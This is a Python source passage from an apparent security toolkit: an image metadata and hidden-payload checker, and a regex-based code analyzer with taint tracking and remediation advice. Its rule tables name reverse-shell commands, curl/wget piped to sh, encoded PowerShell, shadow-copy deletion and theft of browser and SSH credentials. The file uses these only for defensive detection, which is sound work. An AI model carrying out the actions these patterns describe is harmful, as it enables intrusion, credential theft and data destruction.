        "format": "Unknown",
        "size_kb": "Unknown",
        "md5": "N/A",
        "sha1": "N/A",
        "sha256": "N/A",
        "entropy": 0.0,
        "perceptual_hash": "N/A",
        "content_type": "image/jpeg",
        "last_modified": "Not reported",
        "server": "Local Upload / Source",
        "search_links": {},
        "exif": {},
        "malicious_code_explanation": "",
        "is_malicious": False
    }

    data = raw_bytes
    if not data and img_url:
        clean_url = img_url.strip()
        if not clean_url:
            return {"error": "Please provide an image URL or upload an image file."}
        meta["url"] = clean_url
        
        # Defense: Validate URL against SSRF and local file access
        is_safe, reason = is_safe_public_url(clean_url)
        if not is_safe:
            meta["fetch_error"] = reason
            data = None
        else:
            try:
                req = urllib.request.Request(clean_url, headers={"User-Agent": "Mozilla/5.0 BehindUrDigitalLife/6.0"})
                ctx = get_doh_ssl_context()
                with urllib.request.urlopen(req, context=ctx, timeout=6) as resp:
                    headers = resp.headers
                    meta["content_type"] = headers.get("Content-Type", "image/jpeg")
                    meta["last_modified"] = headers.get("Last-Modified", "Not reported")
                    meta["server"] = headers.get("Server", "Undisclosed")
                    data = resp.read(8 * 1024 * 1024)
            except Exception as e:
                meta["fetch_error"] = str(e)
                data = None

    if not data:
        quoted = urllib.parse.quote(meta["url"])
        meta["search_links"] = {
            "Google Lens": f"https://lens.google.com/uploadbyurl?url={quoted}",
            "Google Images": f"https://images.google.com/searchbyimage?image_url={quoted}",
            "TinEye Reverse Search": f"https://tineye.com/search?url={quoted}",
            "Bing Visual Search": f"https://www.bing.com/images/searchbyimage?cbir=sbi&imgurl={quoted}",
            "Yandex Visual Search": f"https://yandex.com/images/search?rpt=imageview&url={quoted}"
        }
        return meta

    # Metrics
    meta["size_kb"] = f"{len(data) / 1024:.1f} KB"
    meta["md5"] = hashlib.md5(data).hexdigest()
    meta["sha1"] = hashlib.sha1(data).hexdigest()
    meta["sha256"] = hashlib.sha256(data).hexdigest()
    meta["entropy"] = calculate_entropy(data)

    # Perceptual 64-bit difference fingerprint
    sample_stride = max(len(data) // 64, 1)
    sample_bits = []
    for i in range(0, min(len(data) - 1, sample_stride * 64), sample_stride):
        sample_bits.append("1" if data[i] > data[i + 1] else "0")
    bit_str = "".join(sample_bits)[:64]
    meta["perceptual_hash"] = hex(int(bit_str or "0", 2))[2:].zfill(16).upper()

    # Format Detection
    if data.startswith(b"\xff\xd8"):
        meta["format"] = "JPEG / JFIF"
    elif data.startswith(b"\x89PNG\r\n\x1a\n"):
        meta["format"] = "PNG (Portable Network Graphics)"
    elif data.startswith(b"GIF87a") or data.startswith(b"GIF89a"):
        meta["format"] = "GIF (Graphics Interchange Format)"
    elif data.startswith(b"RIFF") and b"WEBP" in data[:16]:
        meta["format"] = "WebP (Google WebP Image)"
    elif data.startswith(b"BM"):
        meta["format"] = "BMP (Windows Bitmap)"
    elif b"<svg" in data[:512].lower():
        meta["format"] = "SVG (Scalable Vector Graphics)"
    else:
        meta["format"] = "Binary / Image Asset"

    # EXIF & Steganography
    exif = parse_exif_data(data)
    meta["exif"] = exif

    # Malicious Code in Image Check & Plain-English Explanation
    explanations = []
    if exif.get("payload_type"):
        meta["is_malicious"] = True
        pt = exif["payload_type"]
        explanations.append(f"• **Hidden Appended File**: Found {exif['extra_bytes_after_eof']} bytes of non-image data hidden after the normal end of the picture file. The payload signature matches a **{pt}**.")
        explanations.append("• **What It Does**: Attackers use this 'Polyglot Steganography' technique to smuggle executable malware or webshells past web firewalls and antivirus scanners by disguising them as normal profile pictures or photos.")
        explanations.append("• **Danger Level**: Critical. If this image is uploaded to a vulnerable web server, an attacker could execute it or extract the hidden archive to compromise the host.")

    if exif.get("exif_scripts_found"):
        meta["is_malicious"] = True
        for scr in exif["exif_scripts_found"]:
            explanations.append(f"• **Injected Script Tag**: {scr} found inside image header metadata.")
        explanations.append("• **What It Does**: Attackers inject server-side code (PHP/Node/JS) into metadata fields (like Artist or Copyright). When an administrator's photo gallery script reads or displays the image, the injected code triggers Remote Code Execution (RCE) or Cross-Site Scripting (XSS).")

    if meta["format"] == "SVG (Scalable Vector Graphics)":
        svg_text = data.decode("utf-8", errors="ignore").lower()
        if "<script" in svg_text or "javascript:" in svg_text or "onload=" in svg_text:
            meta["is_malicious"] = True
            explanations.append("• **SVG Stored XSS Script Detected**: Active `<script>` or event handler tags discovered inside SVG vector image.")
            explanations.append("• **What It Does**: When any user opens or views this SVG file in their browser, the embedded script executes immediately in the context of their session, enabling cookie hijacking or account takeover.")

    meta["malicious_code_explanation"] = "\n".join(explanations) if explanations else "✓ No hidden malware droppers, polyglot payloads, or injected script tags detected inside this image."

    # Multi-Engine Links
    target_for_search = meta["url"] if meta["url"].startswith("http") else "https://images.google.com"
    quoted = urllib.parse.quote(target_for_search)
    meta["search_links"] = {
        "Google Lens": f"https://lens.google.com/uploadbyurl?url={quoted}" if meta["url"].startswith("http") else "https://lens.google.com/",
        "Google Images": f"https://images.google.com/searchbyimage?image_url={quoted}" if meta["url"].startswith("http") else "https://images.google.com/",
        "TinEye Reverse Search": f"https://tineye.com/search?url={quoted}" if meta["url"].startswith("http") else "https://tineye.com/",
        "Bing Visual Search": f"https://www.bing.com/images/searchbyimage?cbir=sbi&imgurl={quoted}" if meta["url"].startswith("http") else "https://www.bing.com/visualsearch",
        "Yandex Visual Search": f"https://yandex.com/images/search?rpt=imageview&url={quoted}" if meta["url"].startswith("http") else "https://yandex.com/images/"
    }

    return meta

# ------------------------------------------------------------
# MODULE 4: ADVANCED SECURITY CODE ANALYZER
# AST-based | Taint-propagating | Behavior-chain | CWE-mapped
# Confidence-scored | Language-specific remediation
# ------------------------------------------------------------

import ast as _ast

# ── helpers ─────────────────────────────────────────────────────────────────

def _detect_language(code):
    head  = code[:1200].lower()
    lines = code.splitlines()[:40]
    j     = "\n".join(lines).lower()
    if "<?php" in head:                                        return "php"
    if "#!/usr/bin/env python" in head or ("import " in head and "def " in j): return "python"
    if "#!/bin/bash" in head or "#!/bin/sh" in head:          return "bash"
    if "invoke-expression" in head or "write-host" in head or "param(" in head: return "powershell"
    if "@echo" in head or "echo off" in head:                 return "batch"
    if "import java." in head or "public class " in head:     return "java"
    if "package main" in head and "func main()" in head:      return "go"
    if "using system;" in head or "namespace " in head:       return "csharp"
    if "#include" in head:                                     return "c"
    if ("const " in head or "let " in head) and ("require(" in head or "=>" in head): return "javascript"
    if "select " in head and ("from " in head):               return "sql"
    return "generic"


def _strip_line_comments_and_strings(code, lang):
    """Remove comments preserving line count (returns cleaned text)."""
    result = []
    i, n = 0, len(code)
    in_ml = False

    while i < n:
        ch   = code[i]
        rest = code[i:]

        if in_ml:
            if rest.startswith('*/'):    result += ['  ']; i += 2; in_ml = False; continue
            result.append(' ' if ch != '\n' else '\n'); i += 1; continue

        if ch == '#' and lang in ('python','ruby','bash','generic'):
            while i < n and code[i] != '\n': result.append(' '); i += 1; continue
        if rest.startswith('//') and lang in ('javascript','typescript','java','c','cpp','go','php','csharp','generic'):
            while i < n and code[i] != '\n': result.append(' '); i += 1; continue
        if rest.startswith('/*') and lang in ('javascript','typescript','java','c','cpp','go','php','csharp','css','generic'):
            result += ['  ']; i += 2; in_ml = True; continue

        result.append(ch); i += 1
    return ''.join(result)

# ── SOURCE / SINK / BEHAVIOR definitions ─────────────────────────────────────

_SOURCES = {
    'python':     [r'sys\.argv', r'input\s*\(', r'os\.environ',
                   r'request\.(get|post|form|args|json|data|files|values|query)',
                   r'flask\.request', r'django\.request', r'sys\.stdin',
                   r'open\s*\([^)]*["\']r', r'socket\.(recv|recvfrom)'],
    'javascript': [r'req\.(body|query|params|headers|cookies)',
                   r'request\.(body|query|params)', r'process\.argv',
                   r'document\.cookie', r'location\.(href|search|hash)',
                   r'event\.(data|target)', r'localStorage\.getItem',
                   r'window\.location', r'fetch\(.*\)\.then',
                   r'fs\.readFileSync', r'fs\.readFile'],
    'php':        [r'\$_(GET|POST|REQUEST|FILES|COOKIE|SERVER|ENV)\[',
                   r'file_get_contents\s*\(["\']php://input',
                   r'getallheaders\('],
    'bash':       [r'\$\{?[1-9]\}?', r'\$@', r'read\s+\w+'],
    'powershell': [r'\$args', r'\$input', r'Read-Host', r'\$_', r'param\s*\('],
    'java':       [r'getParameter\s*\(', r'args\[', r'getHeader\s*\(',
                   r'readLine\s*\('],
    'generic':    [r'argv', r'stdin', r'input', r'request', r'query', r'param',
                   r'user_input', r'userdata', r'raw_input', r'req\.body'],
}

_SINKS = [
    {'id': 'os_cmd',          'cwe': 'CWE-78',  'severity': 'HIGH',
     'patterns': [r'os\.system\s*\(', r'subprocess\.(call|run|Popen)\s*\(',
                   r'passthru\s*\(', r'shell_exec\s*\(', r'popen\s*\(',
                   r'Runtime\.getRuntime\(\)\.exec', r'child_process\.(exec|execSync|spawn|spawnSync)\s*\(',
                   r'process\.binding', r'os\.popen\s*\('],
     'title': 'OS Command Execution Sink',
     'behavior': 'Execution/ShellExecution'},
    {'id': 'eval_exec',       'cwe': 'CWE-95',  'severity': 'HIGH',
     'patterns': [r'(?<!\w)eval\s*\(', r'new\s+Function\s*\(', r'Function\s*\(',
                   r'exec\s*\([^)]*[^_a-z]', r'execfile\s*\(',
                   r'vm\.runInNewContext\s*\(', r'vm\.runInThisContext\s*\(',
                   r'setTimeout\s*\([^,]+[a-zA-Z]', r'setInterval\s*\([^,]+[a-zA-Z]',
                   r'compile\s*\([^)]+\).*eval'],
     'title': 'Dynamic Code Evaluation Sink',
     'behavior': 'Execution/DynamicEval'},
    {'id': 'sql_injection',   'cwe': 'CWE-89',  'severity': 'HIGH',
     'patterns': [r'execute\s*\([^)]*["\']\s*[+%]',
                   r'SELECT\s+.{0,60}\+', r'INSERT\s+INTO.{0,60}\+',
                   r'WHERE.{0,60}(?:\+|f["\']|%s|format\s*\()',
                   r'cursor\.execute\s*\([^)]*%'],
     'title': 'SQL Injection Sink',
     'behavior': 'CredentialAccess/DatabaseDump'},
    {'id': 'xss',             'cwe': 'CWE-79',  'severity': 'MEDIUM',
     'patterns': [r'innerHTML\s*=[^=]', r'outerHTML\s*=[^=]',
                   r'document\.write\s*\(', r'v-html\s*='],
     'title': 'HTML Injection / XSS Sink',
     'behavior': 'Network/XSS'},
    {'id': 'file_write',      'cwe': 'CWE-73',  'severity': 'MEDIUM',
     'patterns': [r'open\s*\([^)]*["\']w["\']', r'fs\.(writeFile|writeFileSync)\s*\(', r'file_put_contents\s*\('],
     'title': 'File Write Sink',
     'behavior': 'FileOps/Write'},
    {'id': 'path_traversal',  'cwe': 'CWE-22',  'severity': 'MEDIUM',
     'patterns': [r'open\s*\([^)]*(?:\+|f["\']|format\s*\()',
                   r'readfile\s*\(', r'file_get_contents\s*\([^)]*\$_',
                   r'fs\.(readFile|readFileSync|writeFile|unlink|rm)\s*\([^)]*(?:\+|req\.)'],
     'title': 'Path Traversal Sink',
     'behavior': 'FileOps/Read'},
    {'id': 'deserialization',  'cwe': 'CWE-502', 'severity': 'HIGH',
     'patterns': [r'pickle\.loads?\s*\(', r'yaml\.load\s*\([^,)]+\)',
                   r'unserialize\s*\(', r'Marshal\.load\s*\(',
                   r'ObjectInputStream'],
     'title': 'Unsafe Deserialization Sink',
     'behavior': 'Execution/Deserialization'},
    {'id': 'network_send',    'cwe': 'CWE-918', 'severity': 'LOW',
     'patterns': [r'urllib\.request\.urlopen\s*\(', r'requests\.(get|post|put)\s*\(',
                   r'fetch\s*\(', r'axios\.(get|post)\s*\(', r'http\.get\s*\(', r'https\.get\s*\(',
                   r'socket\.connect\s*\(', r'net\.connect\s*\('],
     'title': 'Outbound Network Request',
     'behavior': 'Network/Exfiltration'},
]

_ALWAYS_FLAG = [
    {'id': 'reverse_shell',
     'cwe': 'CWE-506', 'severity': 'CRITICAL',
     'patterns': [r'/dev/tcp/[\d.]+', r'nc\s+[\d.]+\s+\d+\s+-e',
                   r'bash\s+-i\s+>&\s*/dev/tcp',
                   r'socket\.connect\s*\(.*\d{2,5}.*\).*(?:subprocess|os\.dup2)'],
     'title': 'Reverse Shell / Backdoor',
     'behavior': 'Execution/ReverseShell',
     'why': 'Establishes an outbound TCP connection and pipes an interactive shell to a remote host — granting the attacker full invisible system control.'},
    {'id': 'hardcoded_secret',
     'cwe': 'CWE-798', 'severity': 'HIGH',
     'patterns': [r'(?:password|passwd|api_key|apikey|secret|token|private_key|aws_secret|auth_token)\s*=\s*["\'][^"\'\ ]{8,}["\']',
                   r'ghp_[A-Za-z0-9]{36}', r'AKIA[0-9A-Z]{16}',
                   r'-----BEGIN (RSA|EC|OPENSSH|DSA) PRIVATE KEY'],
     'title': 'Hardcoded Credential / Secret',
     'behavior': 'CredentialAccess/HardcodedSecret',
     'why': 'Credential is embedded directly in code and readable by anyone with source access. Accidental commits to version control expose it permanently.'},
    {'id': 'powershell_encoded',
     'cwe': 'CWE-94', 'severity': 'CRITICAL',
     'patterns': [r'powershell(?:\.exe)?\s+(?:-[Ee]nc|-[Ee]ncodedcommand)',
                   r'powershell.*download', r'powershell.*invoke',
                   r'(?:Invoke-Expression|IEX)\s*\('],
     'title': 'Obfuscated PowerShell Execution',
     'behavior': 'Obfuscation/PowerShellDropper',
     'why': 'Encoded or expression-invoked PowerShell is the standard first-stage payload for ransomware, post-exploitation frameworks, and malware loaders.'},
    {'id': 'destructive_cmd',
     'cwe': 'CWE-284', 'severity': 'CRITICAL',
     'patterns': [r'rm\s+-rf\s+/', r'vssadmin\s+delete\s+shadows',
                   r'Format-Volume', r'format\s+[c-z]:',
                   r'wbadmin\s+delete', r'bcdedit.*recoveryenabled\s+No'],
     'title': 'Destructive / Ransomware Command',
     'behavior': 'Execution/Destructive',
     'why': 'Erases file system content or deletes Volume Shadow Copies — preventing ransomware victims from recovering without a ransom payment.'},
    {'id': 'linux_shell_dropper',
     'cwe': 'CWE-78', 'severity': 'CRITICAL',
     'patterns': [r'curl.*\|\s*sh', r'wget.*\|\s*sh', r'curl.*\|\s*bash', r'wget.*\|\s*bash', r'sh\s+-c', r'bash\s+-c'],
     'title': 'Linux Shell Dropper',
     'behavior': 'Execution/ShellExecution',
     'why': 'Executing a remote payload directly in a shell is a critical indicator of compromise.'},
]

_BEHAVIOR_PATTERNS = {
    'Persistence/StartupMod':       [r'HKEY_CURRENT_USER.*Run', r'crontab\s+-e', r'systemctl\s+enable', r'launchd', r'rc\.local', r'LaunchAgents', r'LaunchDaemons'],
    'Persistence/ScheduledTask':    [r'schtasks', r'at\s+\d{2}:', r'cron\.d'],
    'Discovery/OSInfo':             [r'uname\s+-a', r'os\.uname\s*\(\)', r'platform\.system', r'winreg', r'sys\.version', r'os\.hostname', r'os\.networkInterfaces'],
    'Discovery/NetworkEnum':        [r'socket\.gethostbyname', r'ipconfig', r'ifconfig', r'netstat', r'arp\s+-a'],
    'Discovery/ProcessEnum':        [r'ps\s+aux', r'tasklist', r'os\.listdir\s*\(\s*/proc'],
    'Obfuscation/Base64':           [r'base64\.b64decode', r'atob\s*\(', r'base64_decode\s*\(', r'base64\.decodebytes', r'Buffer\.from\(.*,\s*["\']base64["\']\)'],
    'Obfuscation/HexDecode':        [r'bytes\.fromhex', r'unhex', r'\\x[0-9a-f]{2}'],
    'Obfuscation/StringSplit':      [r'(["\'][^"\']{2,}["\']\s*\+\s*){2,}'],
    'CredentialAccess/BrowserCreds':[r'Login Data', r'cookies\.sqlite', r'keychain', r'Credentials\s+Store', r'\.browser', r'\.cookies', r'IndexedDB'],
    'CredentialAccess/EnvSecrets':  [r'os\.environ\[["\'](PASSWORD|SECRET|KEY|TOKEN|API_KEY)', r'getenv\s*\(["\'](PASSWORD|SECRET)', r'process\.env', r'\.aws', r'\.ssh', r'\.git-credentials'],
    'Network/Download':             [r'urllib\.request\.urlretrieve', r'requests\.get.*\.content', r'wget\s+http', r'curl\s+-[Oo]', r'fetch\(', r'axios\('],
    'Crypto/Mining':                [r'stratum\+tcp', r'minergate', r'coinhive', r'cryptonight'],
    'FileOps/MassDelete':           [r'fs\.unlink', r'fs\.rm', r'fs\.rmdir'],
    'Crypto/Ransomware':            [r'createCipher', r'createCipheriv', r'AES', r'ChaCha20']
}

def _extract_sources(lines, lang, cleaned_lines):
    """Return set of (line_idx, var_name) that are tainted sources."""
    patterns = _SOURCES.get(lang, []) + _SOURCES['generic']
    tainted  = {}  # var_name -> line_idx
    tainted_lines = set()
    for i, (orig, clean) in enumerate(zip(lines, cleaned_lines)):
        for pat in patterns:
            if re.search(pat, clean, re.IGNORECASE):
                tainted_lines.add(i)
                assign = re.match(r'[\$\w]*\s*(\w+)\s*(?:=|:=)\s*', clean.strip())
                if assign:
                    tainted[assign.group(1).lower()] = i
    return tainted, tainted_lines


def _propagate_taint(lines, cleaned_lines, tainted_vars, tainted_lines, max_passes=4):
    """
    Simplified taint propagation: if a line assigns from a tainted variable,
    the new variable also becomes tainted.  Run multiple passes for chained assignments.
    """
    for _ in range(max_passes):
        changed = False
        for i, clean in enumerate(cleaned_lines):
            stripped = clean.strip()
            assign_m = re.match(r'[\$\w]*\s*(\w+)\s*(?:=|:=)\s*(.+)', stripped)
            if not assign_m:
                continue
            new_var  = assign_m.group(1).lower()
            rhs      = assign_m.group(2).lower()
            if new_var in tainted_vars:
                continue
            for tv in list(tainted_vars.keys()):
                if re.search(r'\b' + re.escape(tv) + r'\b', rhs):
                    tainted_vars[new_var] = i
                    tainted_lines.add(i)
                    changed = True
                    break
        if not changed:
            break
    return tainted_vars, tainted_lines


def _taint_reaches_sink(sink_line_idx, tainted_vars, tainted_lines, cleaned_lines, window=30):
    """
    Returns (reaches, confidence_pct, evidence_chain, propagation_path).
    """
    if not tainted_vars and not tainted_lines:
        return False, 10, "No external input sources detected in this file.", []

    chain = []
    sink_clean = cleaned_lines[sink_line_idx].strip() if sink_line_idx < len(cleaned_lines) else ""

    # 1. Check if a tainted variable appears directly in the sink line
    for var, src_line in tainted_vars.items():
        if re.search(r'\b' + re.escape(var) + r'\b', sink_clean, re.IGNORECASE):
            chain = [
                f"Line {src_line+1}: input source → tainted `{var}`",
                f"Line {sink_line_idx+1}: `{var}` used in dangerous sink call",
            ]
            return True, 94, (
                f"Tainted variable `{var}` (sourced from external input at line {src_line+1}) "
                f"flows directly into the dangerous call at line {sink_line_idx+1}."
            ), chain

    # 2. Check if a tainted source line is nearby (within window)
    for tl in tainted_lines:
        if abs(tl - sink_line_idx) <= window:
            chain = [
                f"Line {tl+1}: input source detected nearby",
                f"Line {sink_line_idx+1}: dangerous sink — {window}-line proximity",
            ]
            return True, 62, (
                f"An external input source was found {abs(tl - sink_line_idx)} lines from "
                f"the dangerous call. Tainted variable name not directly matched — possible indirect path."
            ), chain

    # 3. Check context block for any tainted var name
    ctx_start = max(0, sink_line_idx - window)
    ctx_end   = min(len(cleaned_lines), sink_line_idx + 5)
    ctx_block = ' '.join(cleaned_lines[ctx_start:ctx_end]).lower()
    for var in tainted_vars:
        if re.search(r'\b' + re.escape(var) + r'\b', ctx_block):
            chain = [
                f"Tainted `{var}` appears in {window}-line scope of sink",
                f"Line {sink_line_idx+1}: dangerous sink call",
            ]
            return True, 70, (
                f"Tainted variable `{var}` appears within scope of dangerous call. "
                "Possible indirect data-flow path."
            ), chain

    return False, 15, "No tainted variable confirmed to reach this sink in visible scope.", []


def _detect_behaviors(cleaned_lines):
    """Scan for behavioral indicators across all behavior categories."""
    found = {}
    for behavior_tag, patterns in _BEHAVIOR_PATTERNS.items():
        for i, line in enumerate(cleaned_lines):
            for pat in patterns:
                if re.search(pat, line, re.IGNORECASE):
                    if behavior_tag not in found:
                        found[behavior_tag] = []
                    found[behavior_tag].append(i + 1)
    return found


def _get_remediation(sink_id, lang):
    DB = {
        'os_cmd': {
            'python':     "Use subprocess.run(['cmd', arg], shell=False). Never pass user input as a shell string.",
            'javascript': "Use child_process.execFile('cmd', [arg]) — not exec(). Never interpolate variables into shell strings.",
            'php':        "Use escapeshellarg() on every argument, or avoid shell calls and use PHP native functions.",
            'bash':       "Quote all variables: \"$var\". Use printf '%s' \"$input\" for safe argument passing.",
            'java':       "Use new ProcessBuilder(new String[]{'cmd', arg}) — not a shell string.",
            'generic':    "Pass commands as arrays with shell=False. Validate and whitelist all inputs.",
        },
        'eval_exec': {
            'python':     "Replace eval() with ast.literal_eval() for data. Use importlib for dynamic loading.",
            'javascript': "Replace eval() with JSON.parse() for data or use a function dispatch table.",
            'php':        "Eliminate eval() entirely. Use $handlers[$key]() dispatch maps.",
            'generic':    "Avoid eval(). Use structured parsers (JSON/YAML) or safe dispatch mechanisms.",
        },
        'sql_injection': {
            'python':     "cursor.execute('SELECT * FROM t WHERE id = ?', (user_id,)) — always parameterize.",
            'php':        "$stmt = $pdo->prepare('SELECT * FROM t WHERE id = ?'); $stmt->execute([$id]);",
            'javascript': "db.query('SELECT * FROM t WHERE id = $1', [userId]) — pg / node-postgres style.",
            'java':       "PreparedStatement: stmt.setInt(1, id); — never concatenate input into SQL.",
            'generic':    "Always use parameterized prepared statements. Never concatenate input into SQL strings.",
        },
        'xss': {
            'javascript': "Use element.textContent = data. Use DOMPurify.sanitize() only if HTML is required.",
            'php':        "htmlspecialchars($data, ENT_QUOTES, 'UTF-8') before rendering to HTML.",
            'python':     "Jinja2 auto-escaping via {{ var }}. Never use |safe on untrusted data.",
            'generic':    "HTML-encode all user output. Add Content-Security-Policy headers.",
        },
        'file_write': {
            'python':     "Validate filename via os.path.realpath() and enforce base-directory prefix.",
            'javascript': "Use path.resolve() and verify result is within allowed directory.",
            'generic':    "Sanitize file names, verify paths resolve inside allowed directory.",
        },
        'path_traversal': {
            'python':     "Use os.path.realpath(path) and assert it starts with your allowed base dir.",
            'php':        "Use realpath() + basename(). Check result starts with allowed base.",
            'javascript': "path.resolve(__dirname, userInput) — then verify it stays within base dir.",
            'generic':    "Canonicalize all paths and enforce base-directory prefix validation.",
        },
        'deserialization': {
            'python':     "Replace pickle.loads() with json.loads(). If pickle required, use HMAC verification.",
            'php':        "Avoid unserialize() on untrusted data. Use json_decode() instead.",
            'java':       "Use ObjectInputFilter (Java 9+) to whitelist allowed classes.",
            'generic':    "Never deserialize untrusted data. Use JSON or structured data formats.",
        },
        'network_send': {
            'generic':    "Validate and whitelist URLs. Restrict outbound connections via firewall egress rules.",
        },
        'reverse_shell': {
            'generic':    "ISOLATE IMMEDIATELY. Block unauthorized outbound connections. Forensic analysis required.",
        },
        'hardcoded_secret': {
            'python':     "os.environ['API_KEY'] or use python-dotenv. Never commit .env to version control.",
            'javascript': "process.env.API_KEY via .env file. Add .env to .gitignore immediately.",
            'php':        "Use $_ENV['API_KEY'] loaded from a non-web-accessible .env file.",
            'generic':    "Move secrets to environment variables or a secrets manager (Vault, AWS Secrets Manager).",
        },
        'powershell_encoded': {
            'generic':    "Enforce PowerShell Constrained Language Mode and Script Block Logging. Block -EncodedCommand via AppLocker/WDAC.",
        },
        'destructive_cmd': {
            'generic':    "CRITICAL: Forensic analysis required. This code destroys data or disables recovery. Isolate immediately.",
        },
    }
    return DB.get(sink_id, {}).get(lang, DB.get(sink_id, {}).get('generic', 'Apply secure coding best practices.'))


def _build_behavior_summary(behaviors):
    """Group behaviors into readable categories with icons."""
    icons = {
        'Execution':       '⚡', 'Persistence': '📌', 'Discovery': '🔭',
        'Obfuscation':     '🎭', 'CredentialAccess': '🔑', 'Network': '🌐',
        'FileOps':         '📁',
    }
    cats = {}
    for tag, lines_list in behaviors.items():
        cat, sub = tag.split('/', 1)
        if cat not in cats:
            cats[cat] = []
        cats[cat].append((sub, lines_list))
    parts = []
    for cat, items in cats.items():
        icon = icons.get(cat, '•')
        subs = ', '.join(f"{s} (lines {ls})" for s, ls in items)
        parts.append(f"{icon} {cat}: {subs}")
    return parts


def _build_taint_graph_ascii(chain, sink_id, sink_line):
    """Build an ASCII taint-flow graph."""
    if not chain:
        return ""
    box = "┌──────────────┐\n│ User Input   │\n└──────┬───────┘"
    for step in chain[:-1]:
        box += f"\n       ↓\n┌──────────────────────────────────────┐\n│ {step[:38].ljust(38)} │\n└──────────────────────────────────────┘"
    box += f"\n       ↓\n┌──────────────┐\n│ SINK: {sink_id[:8].ljust(8)} │\n│ Line {str(sink_line).ljust(9)} │\n└──────────────┘"
    return box


def analyze_code_security(code_snippet):
    """
    Full-stack context-aware security analyzer wrapper with error-resilience.
    """
    if not code_snippet or not code_snippet.strip():
        return {"error": "Please paste or upload code to analyze."}
    try:
        return _analyze_code_security_impl(code_snippet)
    except Exception as e:
        return {
            "error": f"Failed to analyze code: {str(e)}",
            "score": 0,
            "grade": "F",
            "risk": "UNKNOWN",
            "language": "Unknown",
            "findings": [],
            "total_lines": len(code_snippet.splitlines()),
            "code_snippet": code_snippet[:1500],
            "plain_explanation": f"An unexpected analysis error occurred: {str(e)}",
            "summary": f"Analysis error: {str(e)}",
            "behaviors": {},
            "behavior_alerts": [],
            "input_sources_detected": False,
            "taint_vars": [],
        }


def _analyze_code_security_impl(code_snippet):
    lines        = code_snippet.splitlines()
    lang         = _detect_language(code_snippet)
    cleaned_code = _strip_line_comments_and_strings(code_snippet, lang)
    cleaned_lines = cleaned_code.splitlines()

    # Pad if needed
    while len(cleaned_lines) < len(lines):
        cleaned_lines.append("")

    # Source extraction + taint propagation
    tainted_vars, tainted_lines = _extract_sources(lines, lang, cleaned_lines)
    tainted_vars, tainted_lines = _propagate_taint(lines, cleaned_lines, tainted_vars, tainted_lines)

    findings    = []
    seen        = set()

    # ── Always-flag rules (no taint needed) ──────────────────────────────────
    for rule in _ALWAYS_FLAG:
        for i, clean in enumerate(cleaned_lines):
            for pat in rule['patterns']:
                if re.search(pat, clean, re.IGNORECASE):
                    key = (rule['id'], i)
                    if key in seen: continue
                    seen.add(key)
                    remediation = _get_remediation(rule['id'], lang)
                    findings.append({
                        "line":          i + 1,
                        "code":          lines[i].strip()[:120],
                        "snippet":       lines[i].strip()[:120],
                        "severity":      rule['severity'],
                        "name":          rule['title'],
                        "cwe":           rule['cwe'],
                        "behavior":      rule['behavior'],
                        "is_exploitable":True,
                        "confidence":    94,
                        "taint_graph":   "",
                        "taint_evidence":rule.get('why', 'Inherently dangerous regardless of input source.'),
                        "propagation_chain": [],
                        "desc":          rule.get('why', ''),
                        "plain_english": rule.get('why', ''),
                        "fix":           remediation,
                        "input_sources_found": bool(tainted_vars or tainted_lines),
                        "reachability":  "Unconditional",
                    })

    # ── Taint-dependent sink rules ────────────────────────────────────────────
    for sink in _SINKS:
        for pat in sink['patterns']:
            for i, clean in enumerate(cleaned_lines):
                if not re.search(pat, clean, re.IGNORECASE):
                    continue
                key = (sink['id'], i)
                if key in seen: continue
                seen.add(key)

                reaches, conf_pct, evidence, chain = _taint_reaches_sink(
                    i, tainted_vars, tainted_lines, cleaned_lines
                )

                # Determine severity
                base_sev_order = ['INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL']
                base_idx       = base_sev_order.index(sink['severity'])
                if reaches and conf_pct >= 80:
                    final_sev = base_sev_order[min(base_idx + 1, 4)]
                elif reaches:
                    final_sev = sink['severity']
                else:
                    final_sev = base_sev_order[max(base_idx - 1, 0)]

                # Reachability
                if not tainted_vars and not tainted_lines:
                    reachability = "No input sources detected in file"
                elif reaches and conf_pct >= 85:
                    reachability = "Confirmed — tainted input reaches sink"
                elif reaches:
                    reachability = "Probable — indirect taint path detected"
                else:
                    reachability = "Capability only — no taint path confirmed"

                taint_graph = _build_taint_graph_ascii(chain, sink['id'], i + 1) if chain else ""
                remediation = _get_remediation(sink['id'], lang)

                why = (
                    f"A dangerous {sink['title']} was detected. "
                    + (f"External input appears to reach it (confidence {conf_pct}%). "
                       if reaches else
                       f"No confirmed taint path from user input to this call. Capability exists but exploitation is not demonstrated. ")
                    + f"If exploited: {_sink_impact(sink['id'])}"
                )

                findings.append({
                    "line":           i + 1,
                    "code":           lines[i].strip()[:120],
                    "snippet":        lines[i].strip()[:120],
                    "severity":       final_sev,
                    "name":           sink['title'] + (" → " + sink['cwe'] if reaches else " (capability)"),
                    "cwe":            sink['cwe'] if reaches else f"{sink['cwe']} (unconfirmed — no input path)",
                    "behavior":       sink['behavior'],
                    "is_exploitable": reaches,
                    "confidence":     conf_pct if reaches else max(10, conf_pct - 15),
                    "taint_graph":    taint_graph,
                    "taint_evidence": evidence,
                    "propagation_chain": chain,
                    "desc":           why,
                    "plain_english":  why,
                    "fix":            remediation,
                    "input_sources_found": bool(tainted_vars or tainted_lines),
                    "reachability":   reachability,
                })

    # ── Behavior chain detection ──────────────────────────────────────────────
    behaviors = _detect_behaviors(cleaned_lines)

    # Detect suspicious behavior combinations (chains)
    behavior_alerts = []
    b_keys = set(behaviors.keys())
    if 'Obfuscation/Base64' in b_keys and ('Execution/DynamicEval' in b_keys or 'Network/Download' in b_keys):
        behavior_alerts.append("⚠ SUSPICIOUS CHAIN: Base64 decode → Dynamic execution or network download — common malware delivery pattern")
    if 'Network/Download' in b_keys and 'Execution/ShellExecution' in b_keys:
        behavior_alerts.append("⚠ SUSPICIOUS CHAIN: Network download → Shell execution — dropper/loader behavior")
    if 'Persistence/StartupMod' in b_keys or 'Persistence/ScheduledTask' in b_keys:
        behavior_alerts.append("⚠ PERSISTENCE: Code modifies startup entries or scheduled tasks — common malware technique")
    if 'CredentialAccess/BrowserCreds' in b_keys:
        behavior_alerts.append("⚠ CREDENTIAL THEFT: Browser credential store access detected")

    # ── Score calculation ─────────────────────────────────────────────────────
    score = 100
    for f in findings:
        sev = f['severity']
        con = f['confidence']
        if sev == 'CRITICAL':                     score -= 40
        elif sev == 'HIGH' and con >= 80:         score -= 28
        elif sev == 'HIGH':                       score -= 18
        elif sev == 'MEDIUM' and con >= 70:       score -= 14
        elif sev == 'MEDIUM':                     score -= 8
        elif sev == 'LOW':                        score -= 4
